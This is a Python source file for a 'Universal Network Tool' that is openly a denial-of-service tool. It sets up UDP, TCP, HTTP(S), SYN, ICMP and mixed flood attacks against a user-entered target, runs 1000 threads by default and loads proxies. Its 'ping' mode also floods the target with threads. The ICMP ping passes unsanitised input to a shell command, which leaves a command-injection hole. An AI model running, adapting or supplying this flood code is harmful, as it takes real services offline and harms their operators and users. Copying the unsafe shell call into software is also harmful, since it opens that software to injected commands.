import socket
import threading
import time
import random
import string
import requests
import sys
import os
import subprocess
import platform
from colorama import Fore, Style, init
import struct
from datetime import datetime
import urllib3

# Отключаем предупреждения SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class UniversalNetworkTool:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.target_url = None
        self.tool_type = "ping"  # ping, ddos
        self.ping_mode = "tcp"
        self.attack_type = "UDP"
        self.threads = 1000  # Увеличиваем до 1000 потоков для максимальной мощности
        self.duration = 60
        self.is_running = False
        self.proxies = []
        self.load_proxies()
        self.stats = {
            'successful_pings': 0,
            'failed_pings': 0,
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'total_packets': 0,
            'total_latency': 0,
            'min_latency': float('inf'),
            'max_latency': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'active_threads': 0
        }

    def load_proxies(self):
        """Load proxies from proxies.txt"""
        try:
            if os.path.exists('Tools/proxies.txt'):
                with open('Tools/proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"{Fore.CYAN}[*] Loaded {len(self.proxies)} proxies")
        except:
            pass

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}")
        print("   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓")
        print(" ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒")
        print(" ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░")
        print(" ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ ")
        print(" ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒")
        print(" ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
        print("  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░")
        print("    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   ")
        print("     ░       ░           ░  ░         ░             ░            ░   ")
        print(f"{Fore.MAGENTA}                                by Sqrilizz\n")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                    UNIVERSAL NETWORK TOOL v6.1                              ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        """Get user input"""
        print(f"{Fore.CYAN}[*] Universal Network Tool Configuration")
        print(f"{Fore.CYAN}[*] =====================================\n")
        
        # Tool Type Selection
        print(f"{Fore.CYAN}[*] Tool Types:")
        print(f"{Fore.WHITE}    1. IP Pinger - пинг IP адресов")
        print(f"{Fore.WHITE}    2. DDoS Tool - DDoS атаки")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Choose type (1-2): ").strip()
                if choice == '1':
                    self.tool_type = "ping"
                    break
                elif choice == '2':
                    self.tool_type = "ddos"
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-2.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Get specific inputs based on type
        if self.tool_type == "ping":
            return self.get_ping_input()
        elif self.tool_type == "ddos":
            return self.get_ddos_input()

    def get_ping_input(self):
        """Get inputs for ping tool"""
        print(f"\n{Fore.CYAN}[*] IP Pinger Configuration")
        
        # Target IP/URL
        print(f"\n{Fore.YELLOW}[*] Enter target IP or URL: ", end="")
        target = input().strip()
        
        if target.startswith(('http://', 'https://')):
            self.target_url = target
            self.target_ip = target.split('://')[1].split('/')[0]
        else:
            self.target_ip = target
            self.target_url = f"http://{target}"

        # Ping Mode
        print(f"\n{Fore.CYAN}[*] Ping Modes:")
        print(f"{Fore.WHITE}    1. TCP Ping - пинг TCP портов")
        print(f"{Fore.WHITE}    2. ICMP Ping - традиционный пинг")
        print(f"{Fore.WHITE}    3. UDP Ping - пинг UDP портов")
        print(f"{Fore.WHITE}    4. HTTP Ping - проверка веб-сервера")
        print(f"{Fore.WHITE}    5. HTTPS Ping - проверка защищенного веб-сервера")
        print(f"{Fore.WHITE}    6. SYN Ping - SYN пакеты")
        print(f"{Fore.WHITE}    7. Multi-Port Scan - сканирование портов")
        print(f"{Fore.WHITE}    8. Mixed Ping - все методы")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-8): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6', '7', '8']:
                    modes = {
                        '1': 'tcp',
                        '2': 'icmp',
                        '3': 'udp',
                        '4': 'http',
                        '5': 'https',
                        '6': 'syn',
                        '7': 'multiport',
                        '8': 'mixed'
                    }
                    self.ping_mode = modes[choice]
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-8.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Port (for TCP/UDP/SYN)
        if self.ping_mode in ['tcp', 'udp', 'syn']:
            try:
                self.target_port = int(input(f"{Fore.YELLOW}[?] Enter port (default 80): ").strip() or "80")
            except ValueError:
                self.target_port = 80

        # Threads and Duration
        try:
            self.threads = int(input(f"{Fore.YELLOW}[?] Enter number of threads (default 1000): ").strip() or "1000")
        except ValueError:
            self.threads = 1000

        try:
            self.duration = int(input(f"{Fore.YELLOW}[?] Enter duration in seconds (default 60): ").strip() or "60")
        except ValueError:
            self.duration = 60

        return True

    def get_ddos_input(self):
        """Get inputs for DDoS tool"""
        print(f"\n{Fore.CYAN}[*] DDoS Tool Configuration")
        
        # Target
        print(f"\n{Fore.YELLOW}[*] Enter target IP or URL: ", end="")
        target = input().strip()
        
        if target.startswith(('http://', 'https://')):
            self.target_url = target
            self.target_ip = target.split('://')[1].split('/')[0]
        else:
            self.target_ip = target
            self.target_url = f"http://{target}"

        # Attack Type
        print(f"\n{Fore.CYAN}[*] Attack Types:")
        print(f"{Fore.WHITE}    1. UDP Flood - быстрая атака")
        print(f"{Fore.WHITE}    2. TCP Flood - надежная атака")
        print(f"{Fore.WHITE}    3. HTTP Flood - веб-атака")
        print(f"{Fore.WHITE}    4. HTTPS Flood - защищенная веб-атака")
        print(f"{Fore.WHITE}    5. SYN Flood - сетевая атака")
        print(f"{Fore.WHITE}    6. ICMP Flood - пинг-атака")
        print(f"{Fore.WHITE}    7. Mixed Attack - все методы")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Enter choice (1-7): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6', '7']:
                    attack_types = {
                        '1': 'UDP',
                        '2': 'TCP', 
                        '3': 'HTTP',
                        '4': 'HTTPS',
                        '5': 'SYN',
                        '6': 'ICMP',
                        '7': 'MIXED'
                    }
                    self.attack_type = attack_types[choice]
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-7.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Port (for UDP/TCP/SYN)
        if self.attack_type in ['UDP', 'TCP', 'SYN']:
            try:
                self.target_port = int(input(f"{Fore.YELLOW}[?] Enter port (default 80): ").strip() or "80")
            except ValueError:
                self.target_port = 80

        # Threads and Duration
        try:
            self.threads = int(input(f"{Fore.YELLOW}[?] Enter number of threads (default 1000): ").strip() or "1000")
        except ValueError:
            self.threads = 1000

        try:
            self.duration = int(input(f"{Fore.YELLOW}[?] Enter duration in seconds (default 60): ").strip() or "60")
        except ValueError:
            self.duration = 60

        return True

    def tcp_ping(self, ip, port):
        """TCP ping"""
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                latency = (time.time() - start_time) * 1000
                self.stats['successful_pings'] += 1
                self.update_latency_stats(latency)
                return True, latency
            else:
                self.stats['failed_pings'] += 1
                return False, 0
        except:
            self.stats['failed_pings'] += 1
            return False, 0

    def icmp_ping(self, ip):
        """ICMP ping"""
        try:
            if platform.system().lower() == "windows":
                command = f"ping -n 1 -w 1000 {ip}"
            else:
                command = f"ping -c 1 -W 1 {ip}"
            
            start_time = time.time()
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            latency = (time.time() - start_time) * 1000
            
            if result.returncode == 0:
                self.stats['successful_pings'] += 1
                self.update_latency_stats(latency)
                return True, latency
            else:
                self.stats['failed_pings'] += 1
                return False, 0
        except:
            self.stats['failed_pings'] += 1
            return False, 0

    def udp_ping(self, ip, port):
        """UDP ping"""
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(b"ping", (ip, port))
            sock.close()
            
            latency = (time.time() - start_time) * 1000
            self.stats['successful_pings'] += 1
            self.update_latency_stats(latency)
            return True, latency
        except:
            self.stats['failed_pings'] += 1
            return False, 0

    def http_ping(self, url):
        """HTTP ping"""
        try:
            start_time = time.time()
            response = requests.get(url, timeout=5)
            latency = (time.time() - start_time) * 1000
            
            if response.status_code == 200:
                self.stats['successful_pings'] += 1
                self.update_latency_stats(latency)
                return True, latency
            else:
                self.stats['failed_pings'] += 1
                return False, 0
        except:
            self.stats['failed_pings'] += 1
            return False, 0

    def https_ping(self, url):
        """HTTPS ping"""
        try:
            if not url.startswith('https://'):
                url = f"https://{url}"
            
            start_time = time.time()
            response = requests.get(url, timeout=5, verify=False)
            latency = (time.time() - start_time) * 1000
            
            if response.status_code == 200:
                self.stats['successful_pings'] += 1
                self.update_latency_stats(latency)
                return True, latency
            else:
                self.stats['failed_pings'] += 1
                return False, 0
        except Exception as e:
            self.stats['failed_pings'] += 1
            return False, 0

    def syn_ping(self, ip, port):
        """SYN ping"""
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                latency = (time.time() - start_time) * 1000
                self.stats['successful_pings'] += 1
                self.update_latency_stats(latency)
                return True, latency
            else:
                self.stats['failed_pings'] += 1
                return False, 0
        except:
            self.stats['failed_pings'] += 1
            return False, 0

    def update_latency_stats(self, latency):
        """Update latency statistics"""
        self.stats['total_latency'] += latency
        self.stats['min_latency'] = min(self.stats['min_latency'], latency)
        self.stats['max_latency'] = max(self.stats['max_latency'], latency)

    def udp_flood(self):
        """Оптимизированная UDP flood attack с socket reuse"""
        # Создаем один сокет для переиспользования
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Предгенерированные данные для оптимизации
        data_buffers = [random.randbytes(1024) for _ in range(10)]
        buffer_index = 0
        
        while self.is_running:
            try:
                data = data_buffers[buffer_index % len(data_buffers)]
                sock.sendto(data, (self.target_ip, self.target_port))
                buffer_index += 1
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(data)
            except:
                pass
        
        sock.close()

    def tcp_flood(self):
        """Оптимизированная TCP flood attack с connection pooling"""
        # Предгенерированные данные для оптимизации
        data_buffers = [random.randbytes(1024) for _ in range(10)]
        buffer_index = 0
        
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                sock.connect((self.target_ip, self.target_port))
                data = data_buffers[buffer_index % len(data_buffers)]
                sock.send(data)
                sock.close()
                
                buffer_index += 1
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(data)
            except:
                pass

    def http_flood(self):
        """HTTP flood attack"""
        while self.is_running:
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                response = requests.get(self.target_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    self.stats['successful_requests'] += 1
                else:
                    self.stats['failed_requests'] += 1
            except:
                self.stats['failed_requests'] += 1

    def https_flood(self):
        """HTTPS flood attack"""
        while self.is_running:
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                response = requests.get(self.target_url, headers=headers, timeout=5, verify=False)
                
                if response.status_code == 200:
                    self.stats['successful_requests'] += 1
                else:
                    self.stats['failed_requests'] += 1
            except:
                self.stats['failed_requests'] += 1

    def syn_flood(self):
        """SYN flood attack"""
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                sock.close()
                
                self.stats['packets_sent'] += 1
            except:
                pass

    def icmp_flood(self):
        """ICMP flood attack"""
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                data = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                sock.sendto(data, (self.target_ip, 0))
                sock.close()
                
                self.stats['packets_sent'] += 1
            except:
                pass

    def mixed_attack(self):
        """Mixed attack using all methods"""
        while self.is_running:
            try:
                # Randomly choose attack method
                method = random.choice(['udp', 'tcp', 'http', 'syn'])
                
                if method == 'udp':
                    self.udp_flood()
                elif method == 'tcp':
                    self.tcp_flood()
                elif method == 'http':
                    self.http_flood()
                elif method == 'syn':
                    self.syn_flood()
            except:
                pass

    def ping_thread(self):
        """Ping thread"""
        while self.is_running:
            try:
                if self.ping_mode == 'tcp':
                    success, latency = self.tcp_ping(self.target_ip, self.target_port)
                elif self.ping_mode == 'icmp':
                    success, latency = self.icmp_ping(self.target_ip)
                elif self.ping_mode == 'udp':
                    success, latency = self.udp_ping(self.target_ip, self.target_port)
                elif self.ping_mode == 'http':
                    success, latency = self.http_ping(self.target_url)
                elif self.ping_mode == 'https':
                    success, latency = self.https_ping(self.target_url)
                elif self.ping_mode == 'syn':
                    success, latency = self.syn_ping(self.target_ip, self.target_port)
                elif self.ping_mode == 'mixed':
                    methods = ['tcp', 'icmp', 'udp', 'http', 'https', 'syn']
                    method = random.choice(methods)
                    if method == 'tcp':
                        success, latency = self.tcp_ping(self.target_ip, self.target_port)
                    elif method == 'icmp':
                        success, latency = self.icmp_ping(self.target_ip)
                    elif method == 'udp':
                        success, latency = self.udp_ping(self.target_ip, self.target_port)
                    elif method == 'http':
                        success, latency = self.http_ping(self.target_url)
                    elif method == 'https':
                        success, latency = self.https_ping(self.target_url)
                    elif method == 'syn':
                        success, latency = self.syn_ping(self.target_ip, self.target_port)
                
                self.stats['total_packets'] += 1
                
                if success:
                    print(f"{Fore.GREEN}[+] Ping successful: {latency:.1f}ms")
                else:
                    print(f"{Fore.RED}[-] Ping failed")
                
                time.sleep(0.1)
            except:
                pass

    def attack_thread(self):
        """Attack thread"""
        while self.is_running:
            try:
                if self.attack_type == 'UDP':
                    self.udp_flood()
                elif self.attack_type == 'TCP':
                    self.tcp_flood()
                elif self.attack_type == 'HTTP':
                    self.http_flood()
                elif self.attack_type == 'HTTPS':
                    self.https_flood()
                elif self.attack_type == 'SYN':
                    self.syn_flood()
                elif self.attack_type == 'ICMP':
                    self.icmp_flood()
                elif self.attack_type == 'MIXED':
                    self.mixed_attack()
            except:
                pass

    def print_stats(self):
        """Print current statistics"""
        elapsed = time.time() - self.stats['start_time']
        
        if self.tool_type == "ping":
            total_pings = self.stats['successful_pings'] + self.stats['failed_pings']
            success_rate = (self.stats['successful_pings'] / total_pings * 100) if total_pings > 0 else 0
            avg_latency = (self.stats['total_latency'] / self.stats['successful_pings']) if self.stats['successful_pings'] > 0 else 0
            
            print(f"\n{Fore.CYAN}=== PING STATISTICS ===")
            print(f"{Fore.GREEN}[+] Successful pings: {self.stats['successful_pings']}")
            print(f"{Fore.RED}[-] Failed pings: {self.stats['failed_pings']}")
            print(f"{Fore.YELLOW}[*] Success rate: {success_rate:.1f}%")
            print(f"{Fore.CYAN}[*] Average latency: {avg_latency:.1f}ms")
            print(f"{Fore.MAGENTA}[*] Min latency: {self.stats['min_latency']:.1f}ms")
            print(f"{Fore.BLUE}[*] Max latency: {self.stats['max_latency']:.1f}ms")
            print(f"{Fore.CYAN}[*] Elapsed: {elapsed:.1f}s")
            print(f"{Fore.CYAN}======================\n")
        else:
            total_requests = self.stats['successful_requests'] + self.stats['failed_requests']
            success_rate = (self.stats['successful_requests'] / total_requests * 100) if total_requests > 0 else 0
            rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\n{Fore.CYAN}=== DDoS STATISTICS ===")
            print(f"{Fore.GREEN}[+] Packets sent: {self.stats['packets_sent']}")
            print(f"{Fore.GREEN}[+] Bytes sent: {self.stats['bytes_sent']/1024:.1f} KB")
            print(f"{Fore.GREEN}[+] Successful requests: {self.stats['successful_requests']}")
            print(f"{Fore.RED}[-] Failed requests: {self.stats['failed_requests']}")
            print(f"{Fore.YELLOW}[*] Success rate: {success_rate:.1f}%")
            print(f"{Fore.CYAN}[*] Rate: {rate:.1f} pkt/s")
            print(f"{Fore.MAGENTA}[*] Elapsed: {elapsed:.1f}s")
            print(f"{Fore.CYAN}======================\n")

    def start_ping(self):
        """Start ping operation"""
        print(f"{Fore.CYAN}[*] Starting ping to {self.target_ip}...")
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        # Start threads
        for i in range(self.threads):
            thread = threading.Thread(target=self.ping_thread)
            thread.daemon = True
            thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Ping stopped by user")
        finally:
            self.is_running = False
            self.print_final_stats()

    def start_attack(self):
        """Start DDoS attack"""
        print(f"{Fore.CYAN}[*] Starting {self.attack_type} attack on {self.target_ip}...")
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        # Start threads
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread)
            thread.daemon = True
            thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack stopped by user")
        finally:
            self.is_running = False
            self.print_final_stats()

    def print_final_stats(self):
        """Print final statistics"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                              FINAL STATISTICS                                ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")
        
        elapsed = time.time() - self.stats['start_time']
        
        if self.tool_type == "ping":
            total_pings = self.stats['successful_pings'] + self.stats['failed_pings']
            success_rate = (self.stats['successful_pings'] / total_pings * 100) if total_pings > 0 else 0
            avg_latency = (self.stats['total_latency'] / self.stats['successful_pings']) if self.stats['successful_pings'] > 0 else 0
            
            print(f"{Fore.GREEN}[+] Total successful pings: {self.stats['successful_pings']}")
            print(f"{Fore.RED}[-] Total failed pings: {self.stats['failed_pings']}")
            print(f"{Fore.YELLOW}[*] Success rate: {success_rate:.1f}%")
            print(f"{Fore.CYAN}[*] Average latency: {avg_latency:.1f}ms")
            print(f"{Fore.MAGENTA}[*] Min latency: {self.stats['min_latency']:.1f}ms")
            print(f"{Fore.BLUE}[*] Max latency: {self.stats['max_latency']:.1f}ms")
            print(f"{Fore.CYAN}[*] Total time: {elapsed:.1f} seconds")
        else:
            total_requests = self.stats['successful_requests'] + self.stats['failed_requests']
            success_rate = (self.stats['successful_requests'] / total_requests * 100) if total_requests > 0 else 0
            rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"{Fore.GREEN}[+] Total packets sent: {self.stats['packets_sent']}")
            print(f"{Fore.GREEN}[+] Total bytes sent: {self.stats['bytes_sent']/1024:.1f} KB")
            print(f"{Fore.GREEN}[+] Total successful requests: {self.stats['successful_requests']}")
            print(f"{Fore.RED}[-] Total failed requests: {self.stats['failed_requests']}")
            print(f"{Fore.YELLOW}[*] Success rate: {success_rate:.1f}%")
            print(f"{Fore.CYAN}[*] Average rate: {rate:.1f} pkt/s")
            print(f"{Fore.CYAN}[*] Total time: {elapsed:.1f} seconds")

    def run(self):
        """Main run method"""
        self.print_banner()
        
        if not self.get_user_input():
            return
        
        print(f"\n{Fore.CYAN}[*] Configuration:")
        print(f"{Fore.WHITE}    Type: {self.tool_type}")
        
        if self.tool_type == "ping":
            print(f"{Fore.WHITE}    Mode: {self.ping_mode}")
            print(f"{Fore.WHITE}    Target: {self.target_ip}")
            if self.target_port:
                print(f"{Fore.WHITE}    Port: {self.target_port}")
        else:
            print(f"{Fore.WHITE}    Attack: {self.attack_type}")
            print(f"{Fore.WHITE}    Target: {self.target_ip}")
            if self.target_port:
                print(f"{Fore.WHITE}    Port: {self.target_port}")
        
        print(f"{Fore.WHITE}    Threads: {self.threads}")
        print(f"{Fore.WHITE}    Duration: {self.duration}s")
        
        print(f"\n{Fore.YELLOW}[!] Press Ctrl+C to stop")
        
        if self.tool_type == "ping":
            self.start_ping()
        else:
            self.start_attack()

def main():
    tool = UniversalNetworkTool()
    tool.run()

if __name__ == "__main__":
    main() 